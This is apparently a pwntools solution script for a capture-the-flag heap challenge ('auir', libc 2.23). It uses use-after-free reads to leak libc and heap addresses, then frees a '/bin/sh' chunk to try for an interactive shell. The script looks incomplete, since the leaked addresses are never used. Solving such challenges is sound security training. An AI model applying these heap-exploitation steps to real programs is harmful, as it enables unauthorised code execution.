from pwn import *

s = process("./auir")
libc = ELF('libc-2.23.so')

def recv_menu(n, ch=True):
    for _ in range(n):
        s.recvline()
    if ch:
        s.recvuntil(b">>")

def allocate(n, content):
    s.sendline(b'1')
    recv_menu(1)
    s.sendline(str(n))
    recv_menu(1)
    s.sendline(content)
    recv_menu(7)

def destroy(n):
    s.sendline(b'2')
    recv_menu(1)
    s.sendline(str(n))
    s.recvline()
    if not b'SUCCESSFUL' in s.recvline():
        return False
    recv_menu(7)

def see(n, size):
    s.sendline(b'4')
    recv_menu(1)
    s.sendline(str(n))
    s.recvline()
    r = s.recv(size)
    recv_menu(7)
    return r

def fix(n, size, content):
    s.sendline(b'3')
    recv_menu(1)
    s.sendline(str(n))
    recv_menu(1)
    s.sendline(str(size))
    recv_menu(1)
    s.sendline(content)
    recv_menu(2, ch=False)
    recv_menu(7)

recv_menu(2, ch=False)
recv_menu(7)
allocate(254, "")
allocate(16, "AAAAAAAA")
destroy(0)

leak = see(0, 6)
main_arena_leak = u64(leak+b'\x00\x00')
success("main_arena_leak :"+hex(main_arena_leak))

allocate(16, "BBBBBBBB")
destroy(1)
destroy(2)

heap_leak = u64(see(2, 8))

success("heap_leak :"+hex(heap_leak))
allocate(16, "/bin/sh")
s.sendline("2")
recv_menu(1)
s.sendline("3")
s.interactive()